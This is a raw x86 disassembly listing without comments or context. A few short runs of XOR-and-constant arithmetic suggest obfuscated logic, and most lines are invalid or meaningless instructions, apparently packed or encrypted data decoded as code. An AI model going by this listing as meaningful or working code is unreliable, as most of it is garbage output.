  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	rcr    DWORD PTR [esp+ebx*2],cl
  40c448:	and    bh,bl
  40c44a:	adc    al,0x82
  40c44c:	jle    0x40c4cc
  40c44e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c452:	jno    0x40c42c
  40c454:	xchg   ebp,eax
  40c455:	ja     0x40c438
  40c457:	jne    0x40c421
  40c459:	jg     0x40c3dd
  40c45b:	je     0x40c462
  40c45d:	(bad)  
  40c45e:	rol    BYTE PTR [ecx],0x7
  40c461:	pop    ebp
  40c462:	mov    cl,cl
  40c464:	test   DWORD PTR [edi],ecx
  40c466:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c467:	jo     0x40c481
  40c469:	in     eax,0x70
  40c46b:	pop    esp
  40c46c:	arpl   WORD PTR [edx-0x45],bx
  40c46f:	data16 mov ah,0x7f
  40c472:	je     0x40c432
  40c474:	sub    BYTE PTR ds:0x961e7e7,dh
  40c47a:	sub    BYTE PTR [ecx+0x2b5ce0f4],0xb9
  40c481:	aam    0x5e
  40c483:	lods   al,BYTE PTR ds:[esi]
  40c484:	adc    al,0xc5
  40c486:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c487:	jecxz  0x40c40d
  40c489:	and    BYTE PTR [ebp+0x65],0x8b
  40c48d:	es jbe 0x40c4e5
  40c490:	push   es
  40c491:	mov    ah,0xc5
  40c493:	jmp    0xd430b20a
  40c498:	jno    0x40c431
  40c49a:	xor    eax,0xebadc4bd
  40c49f:	cdq    
  40c4a0:	push   es
  40c4a1:	call   0x1bd9:0x6bdefe26
  40c4a8:	pop    edx
  40c4a9:	imul   eax,DWORD PTR [edi],0xb1fc346f
  40c4af:	stos   BYTE PTR es:[edi],al
  40c4b0:	out    dx,al
  40c4b1:	mov    edx,0xc6886342
  40c4b6:	sbb    al,0xd0
  40c4b8:	(bad)  
  40c4b9:	lock inc eax
  40c4bb:	pop    ebx
  40c4bc:	inc    edi
  40c4bd:	jae    0x40c534
  40c4bf:	inc    edx
  40c4c0:	sti    
  40c4c1:	popf   
  40c4c2:	das    
  40c4c3:	je     0x40c44c
  40c4c5:	pop    edi
  40c4c6:	dec    eax
  40c4c7:	aas    
  40c4c8:	repnz mov ds:0xcf7a991,al
  40c4ce:	jbe    0x40c54b
  40c4d0:	mov    edx,0x5b5ad5f2
  40c4d5:	mov    edi,0x8b8a4b40
  40c4da:	cmp    BYTE PTR [esi-0x54be295d],ch
  40c4e0:	jp     0x40c478
  40c4e2:	cmp    dh,al
  40c4e4:	fnstenv [ebx+0x2357e291]
  40c4ea:	xchg   ebx,edx
  40c4ec:	cmp    BYTE PTR [ebp+ebp*8-0x6c],0x8e
  40c4f1:	sub    eax,DWORD PTR [esp+esi*2+0x69]
  40c4f5:	int    0x5d
  40c4f7:	or     edx,DWORD PTR [edi]
  40c4f9:	mov    dl,0xd7
  40c4fb:	es push 0x94bccefa
  40c501:	imul   DWORD PTR [edx]
  40c503:	mov    ebx,0x7574002
  40c508:	push   es
  40c509:	ss mov dl,0x48
  40c50c:	in     eax,dx
  40c50d:	add    DWORD PTR ds:0x9e890f45,esi
  40c513:	gs xchg ebx,eax
  40c515:	out    dx,al
  40c516:	int    0xda
  40c518:	add    eax,0xbcd587e0
  40c51d:	and    eax,0x85693f04
  40c522:	pop    ds
  40c523:	cli    
  40c524:	add    cl,dh
  40c526:	jmp    0x40c4d5
  40c528:	icebp  
  40c529:	push   esi
  40c52a:	mov    esp,0xc9546f8c
  40c52f:	nop
  40c530:	unpckhps xmm1,XMMWORD PTR [eax]
  40c533:	and    al,0x56
  40c535:	mov    dh,0xc6
  40c537:	lods   al,BYTE PTR ds:[esi]
  40c538:	popf   
  40c539:	jg     0x40c4df
  40c53b:	mov    eax,DWORD PTR [edi+edi*4-0x299315d9]
  40c542:	pop    edx
  40c543:	addr16 into 
  40c545:	shl    DWORD PTR [edx-0x53],cl
  40c548:	jmp    0x9011:0x1feecc8c
  40c54f:	test   ebp,esp
  40c551:	or     BYTE PTR [eax+0x709262f7],dh
  40c557:	jae    0x40c538
  40c559:	jns    0x40c57e
  40c55b:	sub    edx,ebp
  40c55d:	popa   
  40c55e:	mov    ecx,0xeeb4e5f5
  40c563:	(bad)  
  40c564:	xchg   ecx,eax
  40c565:	aad    0x6b
  40c567:	and    DWORD PTR [edi],0x73
  40c56a:	(bad)  
  40c56b:	fs enter 0x7e08,0x31
  40c570:	lods   eax,DWORD PTR ds:[esi]
  40c571:	in     eax,0xec
  40c573:	xor    BYTE PTR [edi],bh
  40c575:	inc    BYTE PTR [ebx]
  40c577:	inc    edi
  40c578:	cmc    
  40c579:	in     eax,0xb
  40c57b:	aam    0x44
  40c57d:	stos   BYTE PTR es:[edi],al
  40c57e:	leave  
  40c57f:	fstp   TBYTE PTR ds:0x8389cfbf
  40c585:	xor    eax,0x6fbed26f
  40c58a:	push   eax
  40c58b:	xchg   ebx,eax
  40c58c:	in     al,dx
  40c58d:	repnz (bad) 
  40c58f:	in     eax,dx
  40c590:	or     al,0xef
  40c592:	mov    ecx,0xe00a0119
  40c597:	inc    edi
  40c598:	dec    ecx
  40c599:	neg    ebx
  40c59b:	xchg   ebp,eax
  40c59c:	pop    ds
  40c59d:	test   al,0x27
  40c59f:	not    bl
  40c5a1:	adc    bl,al
  40c5a3:	sub    al,0x4
  40c5a5:	adc    BYTE PTR [esp+edi*1],ch
  40c5a8:	xchg   edx,eax
  40c5a9:	hlt    
  40c5aa:	repz sub ebp,eax
  40c5ad:	fcom   DWORD PTR [esp+edi*1]
  40c5b0:	mov    al,ds:0xe6c2cf37
  40c5b5:	repnz add DWORD PTR ss:[edx-0x6b],ebp
  40c5ba:	cmp    al,0xe8
  40c5bc:	lahf   
  40c5bd:	mov    al,ds:0x2a17e9f5
  40c5c2:	das    
  40c5c3:	add    DWORD PTR [edi-0x1698fc9e],ecx
  40c5c9:	sbb    DWORD PTR [ecx-0x46],ecx
  40c5cc:	and    al,0x7b
  40c5ce:	xchg   ecx,eax
  40c5cf:	gs ins DWORD PTR es:[edi],dx
  40c5d1:	jp     0x40c5a1
  40c5d3:	lds    edi,FWORD PTR [ecx]
  40c5d5:	dec    esi
  40c5d6:	mov    ebx,0x3653d042
  40c5db:	jmp    0x8ac6:0x8b2fce89
  40c5e2:	adc    edi,DWORD PTR [eax-0x1]
  40c5e5:	shl    ah,cl
  40c5e7:	adc    dl,BYTE PTR [ebx-0x190d0eb2]
  40c5ed:	aas    
  40c5ee:	loope  0x40c666
  40c5f0:	clc    
  40c5f1:	pop    ebp
  40c5f2:	fcom   QWORD PTR [esi*1+0x6819f258]
  40c5f9:	cs push esp
  40c5fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5fc:	loop   0x40c5d9
  40c5fe:	adc    dh,ch
  40c600:	push   ebp
  40c601:	lds    esi,FWORD PTR [ecx-0x4d233f22]
  40c607:	xchg   ecx,eax
  40c608:	imul   edi,DWORD PTR [ebp+0x68302270],0xffffffd6
  40c60f:	and    ecx,DWORD PTR [ebp+0x1e]
  40c612:	(bad)  
  40c613:	dec    eax
  40c614:	push   es
  40c615:	dec    esi
  40c616:	add    eax,DWORD PTR [edi]
  40c618:	xchg   BYTE PTR [edi+0x2e2f546d],ch
  40c61e:	dec    esp
  40c61f:	mov    esp,0x4fb5c3f
  40c624:	int3   
  40c625:	sbb    ax,0xf993
  40c629:	pop    eax
  40c62a:	xor    DWORD PTR [ecx],eax
  40c62c:	popf   
  40c62d:	scas   eax,DWORD PTR es:[edi]
  40c62e:	xchg   edx,eax
  40c62f:	call   0x69:0x85e4c073
  40c636:	xchg   edx,eax
  40c637:	arpl   WORD PTR [edx-0x8],dx
  40c63a:	mov    cl,dh
  40c63c:	sub    DWORD PTR [edx-0x3c],edi
  40c63f:	imul   edi,DWORD PTR ds:0x104d9a7f,0xffffff8e
  40c646:	pop    esp
  40c647:	and    BYTE PTR [ebx+0x6dbe1a64],dh
  40c64d:	cld    
  40c64e:	lods   eax,DWORD PTR ds:[esi]
  40c64f:	loop   0x40c69b
  40c651:	stc    
  40c652:	jp     0x40c69f
  40c654:	push   ebx
  40c655:	into   
  40c656:	test   eax,0xfe81eddd
  40c65b:	push   edx
  40c65c:	xchg   edx,eax
  40c65d:	cmp    eax,0x7d6e7a0d
  40c662:	popa   
  40c663:	icebp  
  40c664:	rcl    DWORD PTR [edi-0x74],1
  40c667:	lds    ecx,FWORD PTR [ecx]
  40c669:	mov    al,ds:0xe070ec70
  40c66e:	test   al,0xc6
  40c670:	cmp    BYTE PTR ds:0x94ee3c52,dl
  40c676:	test   BYTE PTR [ebp+0x444c324b],ah
  40c67c:	psubsb mm4,mm3
  40c67f:	jmp    0xa496736b
  40c684:	dec    eax
  40c685:	push   ds
  40c686:	jp     0x40c6a0
  40c688:	sbb    eax,0xc02458bc
  40c68d:	call   0x4516:0x2f8fe201
  40c694:	(bad)  
  40c696:	data16 stos BYTE PTR es:[edi],al
  40c698:	mov    esi,0x32729b
  40c69d:	add    edi,esi
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp+0x713f9ac1],dl
  40c6de:	(bad)  
  40c6df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6e0:	fiadd  WORD PTR [eax+0x7c387e7e]
  40c6e6:	jle    0x40c766
  40c6e8:	dec    ebp
  40c6e9:	push   es
  40c6ea:	jmp    0x365b:0x17a42f6b
  40c6f1:	dec    edi
  40c6f2:	addr16 addr16 add al,0x8e
  40c6f6:	cs dec esi
  40c6f8:	jmp    0xa8b68689
  40c6fd:	mov    dl,0x3c
  40c6ff:	mov    esi,0x82f1b102
  40c704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c705:	add    edi,DWORD PTR [edx+0x7b]
  40c708:	xchg   edi,eax
  40c709:	cmc    
  40c70a:	pause  
  40c70c:	not    DWORD PTR [ebx+0x49]
  40c70f:	dec    edx
  40c710:	xor    edi,DWORD PTR [ecx-0x3785560f]
  40c716:	mov    edx,ebp
  40c718:	push   eax
  40c719:	cli    
  40c71a:	pop    edx
  40c71b:	cmp    ch,dl
  40c71d:	sub    edi,ebx
  40c71f:	pminub mm2,QWORD PTR [edx-0x7]
  40c723:	inc    esp
  40c724:	test   al,0xfa
  40c726:	jl     0x40c72e
  40c728:	stc    
  40c729:	xor    edi,DWORD PTR [ebx+edx*4+0x752ab391]
  40c730:	mov    al,0xc8
  40c732:	scas   eax,DWORD PTR es:[edi]
  40c733:	shl    DWORD PTR [eax+0x16592c6b],cl
  40c739:	jle    0x40c7b2
  40c73b:	fild   QWORD PTR [edi-0x2c]
  40c73e:	in     al,0x3d
  40c740:	push   es
  40c741:	adc    BYTE PTR [ecx+0x74],cl
  40c744:	cmp    ebx,DWORD PTR [bp+di]
  40c747:	repz add eax,0x30b6cd83
  40c74d:	sahf   
  40c74e:	add    BYTE PTR [eax],dh
  40c750:	jae    0x40c7c4
  40c752:	cmp    eax,ecx
  40c754:	sbb    al,0x2f
  40c756:	outs   dx,DWORD PTR ds:[esi]
  40c757:	xchg   ebx,eax
  40c758:	pushf  
  40c759:	fsub   st(6),st
  40c75b:	add    eax,0xeb88cc3f
  40c760:	aaa    
  40c761:	cmp    al,0x31
  40c763:	jno    0x40c734
  40c765:	and    al,0x87
  40c767:	sub    bl,BYTE PTR [ebx]
  40c769:	push   ebp
  40c76a:	and    DWORD PTR [eax+0x28b099f5],esi
  40c770:	or     esp,DWORD PTR [ebx-0xc]
  40c773:	jo     0x40c765
  40c775:	lahf   
  40c776:	jg     0x40c79c
  40c778:	aam    0x72
  40c77a:	pop    ebx
  40c77b:	mov    cl,BYTE PTR [ebx+ecx*1+0x65d776a1]
  40c782:	jg     0x40c778
  40c784:	or     eax,0x200fa41f
  40c789:	outs   dx,DWORD PTR ds:[esi]
  40c78a:	fnstcw WORD PTR [ebp-0x93aeacd]
  40c790:	jb     0x40c744
  40c792:	outs   dx,BYTE PTR ds:[esi]
  40c793:	cmp    eax,0x715974f4
  40c798:	cli    
  40c799:	cmp    eax,0xd3f18f67
  40c79e:	(bad)  
  40c79f:	push   es
  40c7a0:	pop    ebx
  40c7a1:	or     edi,DWORD PTR [ecx+ecx*2+0x528bfb41]
  40c7a8:	inc    ecx
  40c7a9:	mov    al,0x79
  40c7ab:	pop    ds
  40c7ac:	sti    
  40c7ad:	sti    
  40c7ae:	mov    edx,0x85178b36
  40c7b3:	jbe    0x40c756
  40c7b5:	daa    
  40c7b6:	fcomp  QWORD PTR [ecx-0x96566b5]
  40c7bc:	mov    WORD PTR [edi+0x2b65024e],ds
  40c7c2:	call   0xf762:0x82a5f0cb
  40c7c9:	lock stos DWORD PTR es:[edi],eax
  40c7cb:	rcr    al,cl
  40c7cd:	adc    eax,0x29bdc3f2
  40c7d2:	and    bh,BYTE PTR [edi+0x39]
  40c7d5:	mov    eax,0x976d0a2d
  40c7da:	jne    0x40c7a9
  40c7dc:	push   0xa808a160
  40c7e1:	lahf   
  40c7e2:	popa   
  40c7e3:	shl    DWORD PTR [ecx-0x52],0x7
  40c7e7:	xchg   BYTE PTR [eax+0x56cc3b73],ah
  40c7ed:	ds shl bl,cl
  40c7f0:	add    ebp,DWORD PTR [eax-0x1d]
  40c7f3:	(bad)
  40c7f7:	mov    eax,ds:0x87f8f978
  40c7fc:	es test ebx,0x22060c65
  40c803:	stos   BYTE PTR es:[edi],al
  40c804:	pop    esi
  40c805:	iret   
  40c806:	sub    al,0x7c
  40c808:	scas   eax,DWORD PTR es:[edi]
  40c809:	xor    ebp,eax
  40c80b:	xchg   ebp,eax
  40c80c:	cmp    ah,BYTE PTR [esi+0xcb7eb68]
  40c812:	retf   0x5af4
  40c815:	shl    BYTE PTR [esi+0xb],0x8b
  40c819:	or     esp,edx
  40c81b:	sbb    eax,0xbd636928
  40c820:	inc    edi
  40c821:	push   ebx
  40c822:	popf   
  40c823:	or     eax,edx
  40c825:	mov    al,ds:0xcbd83697
  40c82a:	add    al,0x5a
  40c82c:	stos   DWORD PTR es:[edi],eax
  40c82d:	into   
  40c82e:	xlat   BYTE PTR ds:[ebx]
  40c82f:	xor    edi,DWORD PTR [ebx+0x24]
  40c832:	xor    eax,0xd1fdbccb
  40c837:	mov    eax,ds:0xb16489ef
  40c83c:	fld    QWORD PTR [esi-0x4f51e396]
  40c842:	lods   eax,DWORD PTR ds:[esi]
  40c843:	mov    esp,0x516072c0
  40c848:	mov    ch,BYTE PTR [ebp+edi*2-0x2a27ecf5]
  40c84f:	xor    al,0x57
  40c851:	stos   DWORD PTR es:[edi],eax
  40c852:	add    eax,0xe7b19200
  40c857:	inc    esi
  40c858:	pop    ecx
  40c859:	aam    0xfc
  40c85b:	mov    esi,0x108f4c1e
  40c860:	out    0x1a,eax
  40c862:	pop    ecx
  40c863:	dec    edi
  40c864:	pop    ecx
  40c865:	mov    esp,0xf75049e9
  40c86a:	int3   
  40c86b:	inc    ecx
  40c86c:	cdq    
  40c86d:	retf   
  40c86e:	leave  
  40c86f:	repnz inc ebp
  40c871:	mov    bh,0x27
  40c873:	push   0x60
  40c875:	sbb    ebp,edi
  40c877:	pop    edx
  40c878:	inc    ebx
  40c879:	jle    0x40c88c
  40c87b:	mov    BYTE PTR [edx],dh
  40c87d:	sahf   
  40c87e:	gs xchg ecx,eax
  40c880:	xchg   ebp,eax
  40c881:	inc    edi
  40c882:	sbb    BYTE PTR [esp+ecx*4],0x76
  40c886:	and    al,0x9e
  40c888:	push   0xffffffc4
  40c88a:	ror    DWORD PTR [ecx],1
  40c88c:	dec    ebx
  40c88d:	(bad)  
  40c88e:	sub    ebp,DWORD PTR [edi+0x73]
  40c891:	icebp  
  40c892:	inc    edx
  40c893:	mov    ds:0x7ca19c83,eax
  40c898:	ja     0x40c828
  40c89a:	bound  ebx,QWORD PTR [ebx]
  40c89c:	or     BYTE PTR [ebp+0x1d],al
  40c89f:	adc    DWORD PTR [ebx],0x31
  40c8a2:	push   ss
  40c8a3:	fcmove st,st(0)
  40c8a5:	adc    eax,0x7c5174dc
  40c8aa:	xchg   esi,eax
  40c8ab:	in     eax,dx
  40c8ac:	jno    0x40c900
  40c8ae:	mov    al,ds:0xdd2364f
  40c8b3:	mov    al,0x6e
  40c8b5:	in     al,0x59
  40c8b7:	add    DWORD PTR [esi+0x50e6286],0xdae15e05
  40c8c1:	shr    DWORD PTR [ebx],cl
  40c8c3:	in     al,dx
  40c8c4:	int3   
  40c8c5:	outs   dx,DWORD PTR ds:[esi]
  40c8c6:	cmp    DWORD PTR [eax-0x4c],0x39
  40c8ca:	sub    ebp,DWORD PTR [ebx-0x3e]
  40c8cd:	mov    ecx,ebx
  40c8cf:	bound  esi,QWORD PTR [edx]
  40c8d1:	cmp    edi,0x4b4eedf
  40c8d7:	lahf   
  40c8d8:	fld    QWORD PTR fs:[edi-0x62]
  40c8dc:	call   0x9b4f:0x9efd9165
  40c8e3:	pop    ebx
  40c8e4:	jle    0x40c875
  40c8e6:	mov    al,0x36
  40c8e8:	stos   BYTE PTR es:[edi],al
  40c8e9:	outs   dx,DWORD PTR ds:[esi]
  40c8ea:	aam    0x36
  40c8ec:	or     al,0xe3
  40c8ee:	in     al,dx
  40c8ef:	jns    0x40c8f4
  40c8f1:	jmp    0x6c9:0x743c0401
  40c8f8:	out    0xb,eax
  40c8fa:	(bad)  
  40c8fb:	sbb    DWORD PTR [edx+ebx*4],ebp
  40c8fe:	loop   0x40c904
  40c900:	cmp    BYTE PTR [eax-0x44],dh
  40c903:	xlat   BYTE PTR ds:[ebx]
  40c904:	(bad)  
  40c905:	mov    es:0x47f1e038,al
  40c90b:	das    
  40c90c:	mov    BYTE PTR [edx],dh
  40c90e:	addr16 xchg ebx,eax
  40c910:	fmul   QWORD PTR [edx-0x2836dce5]
  40c916:	xchg   ebp,eax
  40c917:	or     al,0x34
  40c919:	icebp  
  40c91a:	int    0xd4
  40c91c:	lds    edx,FWORD PTR [ebx+ebp*1+0x68]
  40c920:	cdq    
  40c921:	call   0xea96c7aa
  40c926:	sub    al,0x1f
  40c928:	xor    ebx,DWORD PTR [esi+ebx*1-0x2]
  40c92c:	sbb    BYTE PTR [ebx+ecx*4],0x55
  40c930:	adc    al,0x33
  40c932:	shr    ecx,0x5e
  40c935:	add    al,BYTE PTR [eax]
  40c937:	add    BYTE PTR [edi],al
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [esi],eax
  40c945:	dec    ebx
  40c946:	mov    ecx,DWORD PTR [edi+0x7e7e8e98]
  40c94c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c950:	test   al,0xf2
  40c952:	nop
  40c953:	jmp    0x3e6a:0x99be96b3
  40c95a:	jp     0x40c95f
  40c95c:	and    esi,DWORD PTR [ebx-0x6f]
  40c95f:	fisub  WORD PTR [esi]
  40c961:	in     eax,dx
  40c962:	rcl    BYTE PTR [edi],1
  40c964:	push   ebx
  40c965:	in     al,dx
  40c966:	mov    eax,ds:0x71917a7e
  40c96b:	xchg   DWORD PTR [edi+0x1f],esi
  40c96e:	popa   
  40c96f:	inc    DWORD PTR [edx]
  40c971:	fstp   DWORD PTR [esi+0x2b]
  40c974:	push   0x13
  40c976:	(bad)  
  40c977:	or     ebp,DWORD PTR [edx-0x2b]
  40c97a:	jl     0x40c94d
  40c97c:	xchg   DWORD PTR [edx+0x3890e75d],eax
  40c982:	xchg   BYTE PTR [edx+0x13],al
  40c985:	sti    
  40c986:	sub    al,0x6f
  40c988:	shr    DWORD PTR [edi],cl
  40c98a:	jae    0x40c9af
  40c98c:	inc    eax
  40c98d:	dec    esi
  40c98e:	in     eax,0x12
  40c990:	and    eax,0xa061fe85
  40c995:	es mov ecx,0xa5588a12
  40c99b:	mov    BYTE PTR [ebp+0x6e806e06],bh
  40c9a1:	dec    edi
  40c9a2:	jnp    0x40c9fb
  40c9a4:	sar    DWORD PTR [eax],1
  40c9a6:	sahf   
  40c9a7:	sub    bh,cl
  40c9a9:	xchg   esi,eax
  40c9aa:	in     eax,dx
  40c9ab:	adc    BYTE PTR [edi-0x45],dh
  40c9ae:	fsub   st,st(0)
  40c9b0:	jno    0x40ca1f
  40c9b2:	sub    ecx,eax
  40c9b4:	outs   dx,BYTE PTR ds:[esi]
  40c9b5:	js     0x40c982
  40c9b7:	jbe    0x40c994
  40c9b9:	mov    ecx,DWORD PTR [edi]
  40c9bb:	sbb    al,0x8e
  40c9bd:	xchg   ah,bl
  40c9bf:	xlat   BYTE PTR ds:[ebx]
  40c9c0:	in     eax,dx
  40c9c1:	sbb    al,0xfc
  40c9c3:	xor    ebx,eax
  40c9c5:	test   eax,0xeaf77d75
  40c9ca:	ficom  DWORD PTR [edi]
  40c9cc:	or     BYTE PTR [ebx],dh
  40c9ce:	mov    ds:0x10661151,al
  40c9d3:	sub    esp,0x489679d3
  40c9d9:	xor    eax,0x1bbb6070
  40c9de:	mov    dl,0xb3
  40c9e0:	repnz shl DWORD PTR [eax],0xbe
  40c9e4:	je     0x40c99c
  40c9e6:	and    ecx,ebx
  40c9e8:	dec    edi
  40c9e9:	and    eax,0x140f7612
  40c9ee:	mov    edx,0x1bc6f069
  40c9f3:	fwait
  40c9f4:	dec    edi
  40c9f5:	or     al,0xee
  40c9f7:	nop
  40c9f8:	mov    dh,0x94
  40c9fa:	sub    eax,0x380091b4
  40c9ff:	sti    
  40ca00:	lods   al,BYTE PTR ds:[esi]
  40ca01:	enter  0x2ea7,0xf0
  40ca05:	cmp    DWORD PTR [ebp+0x73],edi
  40ca08:	push   es
  40ca09:	push   ecx
  40ca0a:	or     BYTE PTR [esp+esi*8],al
  40ca0d:	mov    cl,0x56
  40ca0f:	rcl    al,0x5a
  40ca12:	cli    
  40ca13:	(bad)  
  40ca14:	mov    al,ds:0xd1bf94c6
  40ca19:	aaa    
  40ca1a:	jb     0x40ca14
  40ca1c:	adc    eax,0xccda3efe
  40ca21:	cmp    ch,dl
  40ca23:	(bad)  
  40ca24:	das    
  40ca25:	retf   
  40ca26:	adc    al,0xe4
  40ca28:	mov    ebp,0x4c9b3fc9
  40ca2d:	leave  
  40ca2e:	mov    dl,0xe9
  40ca30:	xor    al,0x7e
  40ca32:	push   cs
  40ca33:	xor    eax,0x6674e621
  40ca38:	cmp    BYTE PTR [ecx-0xb],cl
  40ca3b:	sub    DWORD PTR [edi+ebp*8],0x5bbcfc52
  40ca42:	mov    esi,0x6fb9c800
  40ca47:	xor    al,0x13
  40ca49:	je     0x40ca31
  40ca4b:	jge    0x40ca04
  40ca4d:	add    BYTE PTR [esi-0x1c2e7bfc],al
  40ca53:	xchg   edi,eax
  40ca54:	or     eax,DWORD PTR [ecx]
  40ca56:	test   eax,0xcd985903
  40ca5b:	in     eax,dx
  40ca5c:	add    eax,0x89e33bee
  40ca61:	cs push eax
  40ca63:	outs   dx,BYTE PTR ds:[esi]
  40ca64:	xchg   esi,eax
  40ca65:	fisubr DWORD PTR [ebp+eax*4+0x5cef4fd2]
  40ca6c:	pop    ds
  40ca6d:	lods   al,BYTE PTR ds:[esi]
  40ca6e:	loopne 0x40ca25
  40ca70:	dec    edx
  40ca71:	push   esp
  40ca72:	cmc    
  40ca73:	in     eax,dx
  40ca74:	mov    ebx,ecx
  40ca76:	shr    DWORD PTR [ebx],1
  40ca78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca79:	cmp    ah,BYTE PTR [eax]
  40ca7b:	aas    
  40ca7c:	mov    ds:0x277bf13,eax
  40ca81:	test   DWORD PTR [ebx+0x5d],edx
  40ca84:	push   esi
  40ca85:	or     eax,0x19fbbef
  40ca8a:	test   bh,bh
  40ca8c:	scas   al,BYTE PTR es:[edi]
  40ca8d:	mov    ecx,0x65d51930
  40ca92:	scas   al,BYTE PTR es:[edi]
  40ca93:	mov    ?,WORD PTR [ebx]
  40ca95:	out    dx,al
  40ca96:	sbb    ebx,edx
  40ca98:	arpl   WORD PTR [edi+0x38ba4b94],di
  40ca9e:	inc    bx
  40caa0:	sbb    eax,0x472d6b2
  40caa5:	scas   eax,DWORD PTR es:[edi]
  40caa6:	xor    eax,0x7f55f214
  40caab:	fs add bl,bl
  40caae:	jge    0x40ca50
  40cab0:	pop    eax
  40cab1:	out    0xe9,al
  40cab3:	cmp    DWORD PTR [ecx+0x42],esp
  40cab6:	das    
  40cab7:	inc    edx
  40cab8:	xchg   DWORD PTR [eax+0x40258700],eax
  40cabe:	mov    fs,WORD PTR [eax]
  40cac0:	std    
  40cac1:	and    DWORD PTR [edx],edi
  40cac3:	and    DWORD PTR [esi+0x4ff83100],0x76
  40caca:	mov    ch,0xd1
  40cacc:	ficomp WORD PTR [esp+eax*2]
  40cacf:	xchg   DWORD PTR [edx-0x21],ebx
  40cad2:	inc    edi
  40cad3:	retf   
  40cad4:	adc    eax,0x6715d4cb
  40cad9:	pop    esi
  40cada:	paddusw mm3,QWORD PTR [edi-0x7b]
  40cade:	adc    BYTE PTR [esp+esi*2],dh
  40cae1:	in     eax,0x95
  40cae3:	jae    0x40caef
  40cae5:	adc    BYTE PTR [ebx],ah
  40cae7:	call   0x8eab:0x5b951a96
  40caee:	sub    ebx,esi
  40caf0:	push   edi
  40caf1:	dec    edx
  40caf2:	mov    al,0x96
  40caf4:	lds    ebx,FWORD PTR [ecx-0x40]
  40caf7:	and    DWORD PTR [edx+0x4a124276],0xd55f2636
  40cb01:	add    eax,0xbf7eef1
  40cb06:	dec    DWORD PTR [esi-0x3e]
  40cb09:	aas    
  40cb0a:	popf   
  40cb0b:	mov    eax,0xc63d0b8d
  40cb10:	lods   eax,DWORD PTR ds:[esi]
  40cb11:	in     al,0x64
  40cb13:	fsubr  st,st(1)
  40cb15:	cld    
  40cb16:	push   es
  40cb17:	lahf   
  40cb18:	mov    WORD PTR [esi+0x65],es
  40cb1b:	cli    
  40cb1c:	test   DWORD PTR [ebx],esi
  40cb1e:	cld    
  40cb1f:	loop   0x40cb4a
  40cb21:	std    
  40cb22:	or     BYTE PTR [esi],bl
  40cb24:	ret    0x789d
  40cb27:	and    ah,dl
  40cb29:	mov    ecx,0x80514e3
  40cb2e:	shl    DWORD PTR [esi-0x16defffe],cl
  40cb34:	movq   QWORD PTR gs:[edi+0x1b],mm1
  40cb39:	out    0x9,eax
  40cb3b:	retf   0x73b3
  40cb3e:	bound  esi,QWORD PTR [eax-0x710f81a1]
  40cb44:	sub    al,0x79
  40cb46:	pop    ecx
  40cb47:	add    ebx,DWORD PTR [ebx]
  40cb49:	mov    fs,WORD PTR [ebx+0x75]
  40cb4c:	push   0xd73ba96e
  40cb51:	push   0xfffffff9
  40cb53:	int3   
  40cb54:	cli    
  40cb55:	cmp    eax,DWORD PTR [edi+0x1]
  40cb58:	sbb    DWORD PTR [eax+0x77],ecx
  40cb5b:	iret   
  40cb5c:	jl     0x40cb5b
  40cb5e:	jl     0x40cb50
  40cb60:	jns    0x40cb63
  40cb62:	pusha  
  40cb63:	adc    eax,0x174db43c
  40cb68:	fistp  DWORD PTR [eax]
  40cb6a:	aaa    
  40cb6b:	inc    esi
  40cb6c:	ficomp WORD PTR [esi-0x161add6f]
  40cb72:	ins    DWORD PTR es:[edi],dx
  40cb73:	cli    
  40cb74:	mov    bh,0x87
  40cb76:	leave  
  40cb77:	push   ebx
  40cb78:	sub    ah,BYTE PTR [ebx]
  40cb7a:	je     0x40cb83
  40cb7c:	jge    0x40cb28
  40cb7e:	dec    ebp
  40cb7f:	data16 aas 
  40cb81:	pop    esp
